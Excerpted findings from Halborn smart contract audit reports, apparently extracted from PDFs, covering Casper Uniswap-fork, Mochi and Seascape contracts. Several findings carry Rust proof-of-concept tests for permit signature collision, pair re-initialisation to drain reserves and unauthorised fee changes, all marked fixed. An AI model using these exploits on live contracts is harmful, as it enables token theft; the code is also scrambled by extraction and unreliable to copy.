830 831  ); 832 833 834 835 836 837 838 839 if result == true { Allowances :: instance () . set (& owner , & spender , value self . emit (& PAIREvent :: Approval { owner : owner , spender : spender , value : value , }) ; } else { // signature verification failed runtime :: revert ( Error ::  UniswapV2CorePairFailedVerification ); 840 841 842 843 844 845 } } else { // deadline is equal to or greater than blocktime runtime :: revert ( Error :: UniswapV2CorePairExpire ); } } Risk Level: Likelihood - 5 Impact - 5 Proof Of Concept: Listing 4 // Deploy the contract let ( env , _proxy , _proxy2 , token , owner , _factory_hash ) 0 #[ test ] 1 fn test_pair_permit_hash_collision () { 2 3  deploy_with_keys () ; 4 5 6 7 let spender = env . next_user_with_keys () ; let contract_hash = match token . self_contract_hash () { Key :: Hash ( hash ) => ContractHash :: new ( hash ) , _ => panic! ( \" Contract hash not found \" ) , = 24 }; ); get_permit_type_and_domain_separator ( NAME , contract_hash ); // Some manipulation to make the public_key understandable by let ( domain_separator , permit_type_hash ) = let ( digest , _digest_string ) = make_digest ( let amount = U256 :: from (900001 u128 ); let deadline : u64 = 11000000000000; let nonce = token . nonce ( owner . account_hash ); println! (\" {:?} \" , nonce ); & domain_separator , & permit_type_hash , & Key :: from ( owner . account_hash ). to_string () , & Key :: from ( spender . account_hash ). to_string () , amount , nonce , deadline , 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  ecrecover 30 31  ); 32 33  ecrecover , SIGN THE DIGEST WITH THE OWNER ' S PRIVATE KEY 34 35 36 37 38  tokens 39  signature : {:?} \" , amount , deadline , signature_string . clone () ); 40 41 42 43 44 45 46 owner . account_hash , public_key_string . clone () , signature_string . clone () , Key :: from ( owner . account_hash ) , Key :: from ( spender . account_hash ) , amount , println! (\" Permit call with amount :{:?} , deadline : {:?} , // Call the permit function from the ` owner ` account // He wants to give allowance to ` spender ` to spend ` amount ` // Some manipulation to make the signature understandable by let public_key_bytes = owner . keypair . public . to_bytes () ; let public_key_string = format_for_ecrecover (& public_key_bytes let signature_bytes = owner . keypair . sign (& digest ). to_bytes () ; let signature_string = format_for_ecrecover (& signature_bytes ); token . permit ( 25 deadline , println! () ; println! (\" Spenders ( attacker ) first allowance : {:?} \" , token . ); // Now ` spender ` should have the right to spend ` amount ` let nonce = token . nonce ( owner . account_hash ); println! (\" Updated nonce : {:?} \" , nonce ); println! () ; let amount = U256 :: from (9000010 u128 ); let deadline = 1000000000000; println! (\" Spender adjust the amount and deadline variables in 47 48 49  tokens 50  allowance ( Key :: from ( owner . account_hash ) , Key :: from ( spender .  account_hash ))); 51 52 53 54 55 56 57 58 59  a way to make signature hash same . \" ); println! (\" Spender recalls the permit call same signature but 60  edited parameters amount :{:?} , deadline : {:?} , signature : {:?} \" ,  amount , deadline , signature_string . clone () ); 61 62 63 64 65 66 67 68 69 70  amount is x10 ) : {:?} \" , token . allowance ( Key :: from ( owner . account_hash  ) , Key :: from ( spender . account_hash ))) ; 71 } owner . account_hash , public_key_string . clone () , signature_string . clone () , Key :: from ( owner . account_hash ) , Key :: from ( spender . account_hash ) , amount , deadline , ); println! (\" Updated spender allowance after hash collision ( token . permit ( Recommendation: It is recommended to add delimiters between parameters while creating the data strings, such as let data: String = format!(\"{}:::{}:::{}:::{}:::{}:::{}\",permit_type_hash , owner, spender, value, nonce, deadline); 26 Remediation Plan: SOLVED: The issue was solved in the commit 24dd7 by removing the permit function. 27 ", "labels": ["Halborn", "Rengo_Labs_Uniswaap_Core-Router_Casper", "Severity: Critical"]}, {"title": "MISSING ACCESS CONTROL AND VULNERABLE LOGICAL DESIGN ALLOWS FOR STEALING TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that a pair of tokens does not belong to a unique pair contract, and inside the pair contract, the initialize function is used to set the contract pair of tokens. However, liquidity tokens are the same in each token pair; therefore an attacker can create 2 dummy erc20 contracts then use the initialize function and set pair contracts tokens and mint an infinite amount of liquidity tokens. Afterward, the attacker can again set the pair contracts tokens to normal tokens, and steal tokens from the pair. Code Location: Down below is the code snippet from the initialize function: Listing 5: /pair/pair/src/pair.rs 1170 fn initialize (& mut self , token0 : Key , token1 : Key ,  factory_hash : Key ) { 1171 1172 1173 1174 1175 1176 1177 1178 1179 1180 let factory_hash_getter : Key = self . get_factory_hash () ; if factory_hash == factory_hash_getter { data :: set_token0 ( token0 ); data :: set_token1 ( token1 ); } else { // ( UniswapV2 : FORBIDDEN ) runtime :: revert ( Error :: UniswapV2CorePairForbidden ); } } 28 Risk Level: Likelihood - 5 Impact - 5 Proof Of Concept: Listing 6 let attacker = env . next_user () ; let ( env , proxy , _proxy2 , token , owner , factory_hash ) = let token1 = deploy_token1 (& env ); // normal token let token1_contract_hash = Key :: Hash ( token1 . contract_hash () ); let token1_package_hash = Key :: Hash ( token1 . package_hash () ); // deploy tokens let token0 = deploy_token0 (& env ); // normal token let token0_contract_hash = Key :: Hash ( token0 . contract_hash () ); let token0_package_hash = Key :: Hash ( token0 . package_hash () ); 0 // This test case exploits the missing access control and also  logical flaw in pair . initialize () function . 1 #[ test ] 2 fn poc_malicious_token_pair_mint_steal_liquidity () { 3  deploy1 () ; 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ); 23  to_formatted_string () ); 24 25 26  owner initialize pair ( token0 - token1 ) 27 28 let amount0 : U256 = 30000. into () ; let amount1 : U256 = 2500000. into () ; println! () ; println! (\" {} \" ,\" - Roles - \"); println! (\" {}{} \" , \" User account : \" , owner . to_formatted_string () println! () ; println! (\" {} \" , \" User initialize pair ( token0 - token1 ) \" ); // let factory_hash = Key :: Hash ( factory_hash . package_hash () ); println! (\" {}{} \" , \" Attacker account : \" , owner . token . initialize ( owner , 29 println! (\" {}{:?}{} \" , \" User mints \" , amount0 , \" token0 - token1 ); ); proxy . mint_with_caller ( ); proxy . mint_with_caller ( token0_package_hash , token1_package_hash , factory_hash , owner , token0_contract_hash , Key :: from ( token . self_package_hash () ) , amount0 , owner , token1_contract_hash , Key :: from ( token . self_package_hash () ) , amount0 , 29 30 31 32 33 34  to pair ( Mint is used at this point but logic is same with  transfer ) \"); 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  liquidity 51  token . balance_of ( owner )) ; 52  token . self_package_hash () )) ; 53  ; 54 55 56 57  which has no value token2 and token3 \"); 58 59 60 61 62 63 64 65 & env , \" erc20 - token . wasm \" , \" token2_contract \" , attacker , let decimals : u8 = 18; let init_total_supply : U256 = 0. into () ; let token2 = TestContract :: new ( println! () ; println! (\" {} \" , \" User calls pair - mint () to add liquidity \" ); token . mint_no_ret ( owner , owner ); // normal user ( owner ) adds println! () ; println! (\" {} \" , \" -- Exploitation begins at this point -- \"); println! () ; println! (\" {} \" , \" 1. First attacker deploys 2 dummy ERC20 tokens println! (\" {}{:?} \" , \" User ' s pair balance ( liquidity tokens ): \" , println! (\" {}{:?} \" , \" Pair total supply : \" , token . balance_of ( println! (\" {} \" , \" Attacker ' s pair balance ( liquidity tokens ): 0\" ) 30 \" initial_supply \" => init_total_supply , \" name \" => \" token2 \" , \" symbol \" => \" tk2 \" , \" decimals \" => decimals ); let token2_contract_hash = Key :: Hash ( token2 . contract_hash () ); let token2_package_hash = Key :: Hash ( token2 . package_hash () ); \" initial_supply \" => init_total_supply , \" name \" => \" token3 \" , \" symbol \" => \" tk3 \" , \" decimals \" => decimals ); let token3_contract_hash = Key :: Hash ( token3 . contract_hash () ); let token3_package_hash = Key :: Hash ( token3 . package_hash () ); println! () ; println! (\" {} \" , \" 2. Attacker calls pair . initialize () and sets let token3 = TestContract :: new ( }, runtime_args! { & env , \" erc20 - token . wasm \" , \" token3_contract \" , attacker , runtime_args! { 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92  pair tokens as ( token2 - token3 )\" ); 93 94 95 96 97 98 99 100 101 token . initialize ( attacker , token2_package_hash , token3_package_hash , factory_hash , }, ); println! () ; println! (\" {}{:?}{} \" , \" 3. Attacker mints \" , amount1 , \" token2 -  token3 ( malicious tokens ) to pair \" ); 102 103 104 105 106 107 proxy . mint_with_caller ( owner , token2_contract_hash , Key :: from ( token . self_package_hash () ) , amount1 , ); 31 proxy . mint_with_caller ( owner , token3_contract_hash , Key :: from ( token . self_package_hash () ) , amount1 , ); println! () ; println! (\" {} \" , \" 4. Attacker calls pair - mint () to add liquidity 108 109 110 111 112 113 114 115 116  \" ); 117 token . mint_no_ret ( attacker , attacker ); // attacker adds  liquidity 118 println! (\" {}{:?} \" , \" Attacker 's pair balance ( liquidity tokens ) :  \" , token . balance_of ( attacker )) ; 119 println! (\" {}{:?} \" , \" Pair total supply : \" , token . balance_of (  token . self_package_hash () )) ; 120 121 122 println! () ; println! (\" {} \" , \" 5. Attacker calls pair . initialize () to set  pair tokens at token0 - token1 again \" ); 123 124 125 126 127 128 129 130 131 token . initialize ( attacker , token0_package_hash , token1_package_hash , factory_hash , ); println! () ; println! (\" {} \" , \" --- Balance of pair and attacker before  exploitation ( token0 - token1 ) ---\" ); 132 133  ) 134 135 136  ) 137 138 139 let balance_token0_attacker : U256 = token0 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( attacker )) . unwrap_or_default () ; let balance_token1_attacker : U256 = token1 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( attacker )) . unwrap_or_default () ; let balance_token0_pair : U256 = token0 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( token .  self_package_hash () )) ) 140 141 . unwrap_or_default () ; let balance_token1_pair : U256 = token1 32 142 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( token .  self_package_hash () )) ) 143 144 145 . unwrap_or_default () ; println! (\" {}{} \" ,\" Attacker token0 balance (0) : \" ,  balance_token0_attacker ); 146 println! (\" {}{} \" ,\" Attacker token1 balance (0) : \" ,  balance_token1_attacker ); 147  ; 148  ; 149 150 151 println! (\" {}{} \" ,\" Pair token0 balance : \" , balance_token0_pair ) println! (\" {}{} \" ,\" Pair token1 balance : \" , balance_token1_pair ) println! () ; println! (\" {} \" , \" 6. Attacker transfers all pair tokens to pair  contract and then call burn to get token0 - token1 \" ); 152 token . transfer ( attacker , Key :: from ( token . self_package_hash () ) ,  token . balance_of ( attacker )) ; 153 154 155 156 token . burn_no_ret ( attacker , attacker ); println! () ; println! (\" {} \" , \" --- Balance of pair and attacker before  exploitation ( token0 - token1 ) ---\" ); 157 158  ) 159 160 161  ) 162 163 164 let balance_token0_attacker : U256 = token0 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( attacker )) . unwrap_or_default () ; let balance_token1_attacker : U256 = token1 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( attacker )) . unwrap_or_default () ; let balance_token0_pair : U256 = token0 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( token .  self_package_hash () )) ) 165 166 167 . unwrap_or_default () ; let balance_token1_pair : U256 = token1 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( token .  self_package_hash () )) ) 168 169 170 . unwrap_or_default () ; println! (\" {}{} \" ,\" Attacker token0 balance : \" ,  balance_token0_attacker ); 171 println! (\" {}{} \" ,\" Attacker token1 balance : \" ,  balance_token1_attacker ); 33 172  ; 173  ; 174 175 println! (\" {}{} \" ,\" Pair token0 balance : \" , balance_token0_pair ) println! (\" {}{} \" ,\" Pair token1 balance : \" , balance_token1_pair ) println! (\" {} \" ,\" Attacker steals token0 - token1 from pair  reserves by creating dummy tokens \" ); 176 } Recommendation: It is recommended to add access control checks in order to restrict access to initialize function. Remediation Plan: SOLVED: The issue was solved in the commit 425c9 by implementing access control measures in the initialize function. 34 ", "labels": ["Halborn", "Rengo_Labs_Uniswaap_Core-Router_Casper", "Severity: Critical"]}, {"title": "MISSING ACCESS CONTROL LEADS TO UNAUTHORIZED SETTING TREASURY FEE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the set_treasury_fee_percent inside the pair contract does not have any access control; therefore anyone can change the treasury fee. Attackers can use this vulnerability to lower the treasury fee while trading, or they can manipulate the treasury fee in order to harm other user transactions. Code Location: Down below is the code snippet from the set_treasury_fee_percent function: Listing 7: /pair/pair/src/pair.rs 920 921 922 923 924 925 926 927 928 fn set_treasury_fee_percent (& mut self , treasury_fee : U256 ) { if treasury_fee < 30. into () && treasury_fee > 3. into () { data :: set_treasury_fee ( treasury_fee ); } else if treasury_fee >= 30. into () { data :: set_treasury_fee (30. into () ); } else { data :: set_treasury_fee (3. into () ); } } Risk Level: Likelihood - 5 Impact - 5 35 Proof Of Concept: Listing 8 let ( _env , _proxy , _proxy2 , token , owner , _factory_hash ) = // owner sets normal treasury fee as 20 let treasury_fee : U256 = 20. into () ; token . set_treasury_fee_percent ( owner , treasury_fee ); assert_eq! ( token . treasury_fee () , treasury_fee ); 0 #[ test ] 1 fn poc_unauthorized_set_treasury_fee_percent () { 2  deploy () ; 3 4 5 6 7 8 9 10 11 12 13 14 15 } let attacker = _env . next_user () ; let new_treasury_fee : U256 = 3. into () ; // attacker sets unauthorizedly sets treasury fee as 3 token . set_treasury_fee_percent ( attacker , treasury_fee ); assert_eq! ( token . treasury_fee () , 3. into () ); Recommendation: It is recommended to add access control checks in order to restrict access to set_treasury_fee_percent function. Remediation Plan: SOLVED: The issue was solved in the commit b43db by implementing access control measures in the set_treasury_fee_percent function. 36 ", "labels": ["Halborn", "Rengo_Labs_Uniswaap_Core-Router_Casper", "Severity: Critical"]}, {"title": "MISSING ACCESS CONTROL IN SWAP FOR FLASH LOANS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the swap function inside the pair contract does not implement any access control for flash loan/swap actions; therefore, any user can impersonate the flashswapper contract. There are two possible problems related to this misconfiguration. First, users can use flash loan/swaps without paying fees. Second, when the swap function used for flash loan/swap actions in the pair contract normally calls the flashswapper contracts uniswap_v2_call function to start the process, however when other users call the swap function, they can make the pair contract to call their own contracts and can control the application flow, and they can execute reentrancy attacks to steal tokens. To explain the second case vulnerability with an example; Consider a pair with liquidity: 1000 TokenA 1000 TokenB. 1. Attacker calls swap() with malicious contract with custom data to get 1000 TokenA get 1000 TokenB (Execution flow is transferred to malicious contract.) 2. Malicious contract calls Pair call sync() ( currently pair has: 0 TokenA 1000 TokenB) 3. Attacker transfers 500 TokenA 500 TokenB to pair 4. malicious contract calls mint() Code Location: Down below is the code snippet from the swap function: 37 Listing 9: /pair/pair/src/pair.rs 518 fn swap (& mut self , amount0_out : U256 , amount1_out : U256 , to :  Key , data : String ) { 519  ); 520 521 522 let pair_address : Key = Key :: from ( data :: get_package_hash () let zero : U256 = 0. into () ; if amount0_out > zero || amount1_out > zero { let ( reserve0 , reserve1 , _block_timestamp_last ) = self  . get_reserves () ; // gas savings 523 524 525 526 527 528 529 530 531  token0 { 532 533 if amount0_out < U256 :: from ( reserve0 . as_u128 () ) && amount1_out < U256 :: from ( reserve1 . as_u128 () ) { let token0 : Key = self . get_token0 () ; let token1 : Key = self . get_token1 () ; if to ! = token0 && to ! = token1 { if amount0_out > zero { // convert Key to ContractPackageHash // let token0_hash_add_array = match // // Key :: Hash ( package ) => package , _ => runtime :: revert ( ApiError ::  UnexpectedKeyVariant ) , 534 535 // }; // let token0_package_hash =  ContractPackageHash :: new ( token0_hash_add_array ); 536 let ret : Result <() , u32 > = runtime ::  call_versioned_contract ( 537 538  into () , 539 540 541 542 543 544 545 546 547 548 549 ...( snipped ) // token0_package_hash , token0 . into_hash () . unwrap_or_revert () . None , \" transfer \" , runtime_args! { \" recipient \" => to , \" amount \" => amount0_out }, // optimistically transfer tokens if data . len () > 0 { let uniswap_v2_callee_address : Key = to ; // convert Key to ContractPackageHash let  uniswap_v2_callee_address_hash_add_array = 550 551 match uniswap_v2_callee_address { Key :: Hash ( package ) = > package , 38 552 _ => runtime :: revert ( ApiError ::  UnexpectedKeyVariant ) , 553 554 555 }; let uniswap_v2_callee_package_hash = ContractPackageHash :: new (  uniswap_v2_callee_address_hash_add_array ); 556 557  call_versioned_contract ( let _result : () = runtime :: 558 559 560 561 uniswap_v2_callee_package_hash , None , \" uniswap_v2_call \" , runtime_args! { \" sender \" => data ::  get_callee_package_hash () ,\" amount0 \" => amount0_out , \" amount1 \" =>  amount1_out , \" data \" => data }, 562 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to add access control checks to make sure other actors cannot use the swap function with setting a data parameter, expect the flashswapper contract. Remediation Plan: SOLVED: The issue was solved in the commit 4865e by removing flash-loan functionalities from the pair contract. 39 ", "labels": ["Halborn", "Rengo_Labs_Uniswaap_Core-Router_Casper", "Severity: Critical"]}, {"title": "USERS CAN ADD MALICIOUS PAIRS TO FACTORY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that when the add_liquidity function inside the uniswap -router contract is called with some pair_received parameter, it calls the create_pair function inside the factory contract, and as a result factory contract adds this pair contract hash to the list. However, this process also enables adversaries to add customized malicious pair contracts to the factory contract, which may be programmed to steal users tokens or similar. Code Location: Down below are code snippets from the create_pair and _add_liquidty functions: Listing router.rs (Lines 1074,1092-1101) 10: /uniswap-v2-router/uniswap-v2-router/src/uniswap_v2_- token_a : ContractPackageHash , token_b : ContractPackageHash , amount_a_desired : U256 , amount_b_desired : U256 , amount_a_min : U256 , amount_b_min : U256 , pair_received : Option < Key >, ) -> ( U256 , U256 ) { 1067 fn _add_liquidity ( 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 let factory : ContractPackageHash = data :: factory () ; let args : RuntimeArgs = runtime_args! { \" token0 \" => Key :: from ( token_a ) , \" token1 \" => Key :: from ( token_b ) }; let pair : Key = Self :: call_versioned_contract ( & factory . to_formatted_string () , uniswapv2_contract_methods :: FACTORY_GET_PAIR , 40 1084 1085 1086 1087 args , ); let zero_addr : Key = Key :: from_formatted_str ( \" hash  -0000000000000000000000000000000000000000000000000000000000000000 \"  , ) . unwrap () ; let mut pair_already_exist : bool = false ; 1088 1089 1090 1091 ...( snipped ) 1092 1093 if pair_already_exist == false { // need to call create_pair only once for each pair .  If a same pair is passed again , no need to call this again 1094 1095 1096 1097 1098 1099 1100 1101 1102 let pair = pair_received . unwrap () ; let args = runtime_args! { \" token_a \" => Key :: from ( token_a ) , \" token_b \" => Key :: from ( token_b ) , \" pair_hash \" => Key :: from ( pair ) }; let _ : () = Self :: call_versioned_contract ( & factory . to_formatted_string () , uniswapv2_contract_methods :: FACTORY_CREATE_PAIR ,  // this create_pair method DOES NOT create a new pair , instead it  initializes the pair passed in 1103 1104 1105 args , ); } Listing 11: /factory/factory/src/factory.rs (Lines 74,84,85) ...( snipped ) let _ret : () = runtime :: call_versioned_contract ( 74 fn create_pair (& mut self , token_a : Key , token_b : Key , pair_hash :  Key ) { 75 76 77 78 79 80  token1 , \" factory_hash \" => data :: get_package_hash () } , 81 82 83 84 85 pair_package_hash , None , \" initialize \" , runtime_args! { \" token0 \" => token0 , \" token1 \" => // handling the pair creation by updating the storage self . set_pair ( token0 , token1 , pair_hash ); self . set_pair ( token1 , token0 , pair_hash ); ); 41 86 87 88 let mut pairs : Vec < Key > = get_all_pairs () ; pairs . push ( pair_hash ); self . set_all_pairs ( pairs ); Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to redesign the application to not allow users to add arbitrary pair hashes to factory contract. Remediation Plan: SOLVED: The issue was solved in the commit 04f45 by implementing an access control measure which only gives permission to white listed accounts to use this function. 42 ", "labels": ["Halborn", "Rengo_Labs_Uniswaap_Core-Router_Casper", "Severity: Critical"]}, {"title": "MISSING REMOVE PAIR FUNCTIONALITY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed the factory contract does not implement a remove pair feature, and since the application logic allows anybody to register their pair contracts, it is crucial to implement a remove pair functionality to remove any malicious or unwanted pairs from the factory. Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to add a remove pair function to the factory contract. Remediation Plan: SOLVED: The issue was solved in the commit 65fe2 by implementing a remove_pair function. 43 ", "labels": ["Halborn", "Rengo_Labs_Uniswaap_Core-Router_Casper", "Severity: Medium"]}, {"title": "PAIR SWAP FUNCTION IS RE ENTRANT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the swap function, inside the pair contract, does not have a protection against reentrancy attacks, which makes it vulnerable to attacks such as HAL-05. Code Location: Down below is the code snippet from the swap function: Listing 12: /pair/pair/src/pair.rs 518 fn swap (& mut self , amount0_out : U256 , amount1_out : U256 , to :  Key , data : String ) { 519  ); 520 521 522 let pair_address : Key = Key :: from ( data :: get_package_hash () let zero : U256 = 0. into () ; if amount0_out > zero || amount1_out > zero { ...( snipped ) Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to add a reentrancy guard to the swap function, like the skim and sync functions. 44 Remediation Plan: SOLVED: The issue was solved in the commit 623ce4ab3d8e19436cd709999beb80da9d871e28 by implementing a reentrancy guard to the swap function. 45 ", "labels": ["Halborn", "Rengo_Labs_Uniswaap_Core-Router_Casper", "Severity: Low"]}, {"title": "MISSING PAUSE FUNCTIONALITY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the pair contract does not have a pause functional- ity, which makes it harder to remediate if a critical vulnerability is discovered or a critical situation occur. Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to add a pause functionality to the pair contract. Remediation Plan: SOLVED: The issue was solved in the commit 33219 by implementing pause functionality in the pair contracts. 46 3.10 (HAL-10) PAIR TOKEN BALANCES MAY MANIPULATE EACH OTHER WHEN A TOKEN CONTRACT USED FOR MANY PAIRS - INFORMATIONAL ", "labels": ["Halborn", "Rengo_Labs_Uniswaap_Core-Router_Casper", "Severity: Informational"]}, {"title": "IMPROPER KEY MANAGEMENT POLICY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Mochi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "A fundamental principle of blockchain is decentralization which should be applied as widely as possible in all areas, including key management. Using a single private key to manage a smart contract and perform privi- leged actions such as deploying or upgrading the contract is risky. If the private key is compromised, it could have devastating consequences. For example, on March 5, 2021, the PAID Network smart contract was suc- cessfully attacked despite the smart-contract being previously audited. Approximately $100 million of PAID tokens were extracted by the attacker. In that case, the private key was compromised and the attacker upgraded and replaced the original smart contract with a malicious version that allowed tokens to be burned and minted. Had best practices been imple- mented in the key management policy, the attacker could not have upgraded the contract using a single private key. Requiring multiple signatures in the key-management policy prevents a single user from performing any critical actions. Reference: https://halborn.com/explained-the-paid-network-hack-march -2021/ Risk Level: Likelihood - 5 Impact - 5 Recommendations: Require multiple signatures in the key-management policy to avoid a private-key compromise resulting in loss of control over the smart con- tract. 12 Remediation Plan: Solved: MOCHI team will use a multi-signature wallet for the deployment to the mainnet. 13 ", "labels": ["Halborn", "Mochi", "Severity: Critical"]}, {"title": "BLOCK TIMESTAMP ALIAS USAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Mochi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Reference: Avoid using now Code Location: MOMA.sol Line #49 #67 #68 #77 #104 #133 #135 14 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: Solved: MOCHI team assumes that the use of block.timestamp is safe because their timescales are higher than 900 seconds. 15 ", "labels": ["Halborn", "Mochi", "Severity: Low"]}, {"title": "IGNORE RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Mochi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The return value of an external call is not stored in a local or state variable. In the contract MOMA.sol, the return value in withdrawERC20 is being ignored. Code Location: MOMA.sol Lines #179-183 Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add a return value check to avoid an unexpected crash of the contract. A return value check will help handle exceptions more thoroughly. Remediation plan: team MOCHI issue solved d3d80e892e7ec58cf035311ada98478a8 the in their last commit 9435238 16 ", "labels": ["Halborn", "Mochi", "Severity: Low"]}, {"title": "EXPERIMENTAL FEATURES ENABLED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Mochi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "ABIEncoderV2 is enabled and the use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(...) as arguments in external function calls or in event data without prior assignment to a local variable. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Reference: Solidity Optimizer and ABIEncoderV2 Bug Code Location: MOMA.sol Line #3 Reference: ConsenSys Diligence - Lock pragmas Risk Level: Likelihood - 2 Impact - 2 17 Recommendation: When possible, do not use experimental features in the final live de- ployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). Remediation Plan: Risk Accepted: MOCHI team accepts the risk of using experimental features because they want to use the latest stable and tested version of pragma (0.6.12). 18 ", "labels": ["Halborn", "Mochi", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Mochi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Moma.sol Line #53 #179 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be 19 called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remmediation plan: team issue solved MOCHI d3d80e892e7ec58cf035311ada98478a8 the in their last commit 9435238 20 3.6 MANUAL TESTING ", "labels": ["Halborn", "Mochi", "Severity: Informational"]}, {"title": "CONTRACT ADMIN CAN REVOKE AND RENOUNCE HIMSELF", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Owner of the contract is usually the account which deploys the contract. In the RiverboatFactory.sol smart contract, Only Admin can perform some privileged actions such as setNft, addStaticUser, removeStaticUser etc. . . , the addAdmin function is used to add an Admin role, and the renounceAdmin function is used to renounce being an Admin. It was observed that admin can revoke his role via renounceAdmin. If an admin is mistakenly renounced, administrative access would result in the contract having no admin, eliminating the ability to call privileged functions. In such a case, contracts would have to be redeployed. PoC Steps:  Deploy a RiverboatFactory using the owner address.  Execute riverboatfactory.renounceAdmin() function as using the owner address. 13 Code Location: Listing 1: contracts/RiverboatFactory (Lines 43) 43 44 45 function renounceAdmin () public virtual { renounceRole ( DEFAULT_ADMIN_ROLE , msg . sender ); } Risk Level: Likelihood - 3 Impact - 5 Recommendations: It is recommended that the contract Admin cannot call renounceAdmin without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceAdmin function should be confirmed for two or more users. Remediation Plan: SOLVED: The issue was fixed in commit: c5fd888b95f40e3c3c60f594708887db1922b663 14 ", "labels": ["Halborn", "Seascape_Riverboat_NFT", "Severity: High"]}, {"title": "IMPROPER ACCESS CONTROL POLICY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the smart contracts, implementing a correct Access Control policy is essential to maintain security and decentralization of permissions The features to mint/burn tokens and pause contracts are on a token. given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to keep the principle of least privilege, also known as least authority. Briefly, any process, user, or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in simple systems, but more complex projects require the use of more roles using Role-based access control. The mintType function on RiverboatFactory have no restrictions and can be called by any user. An adversary could leverage this to mint NFTs instead of buying. PoC Steps:  Deploy a RiverboatFactory and RiverboatNft using the owner address.  Call function setFactory and provide address of the RiverboatFactory using owner user address.  Execute mintType function using any user address. 15 Code Location: Listing 2: contracts/RiverboatFactory (Lines 24) 24 25 26 27 function mintType 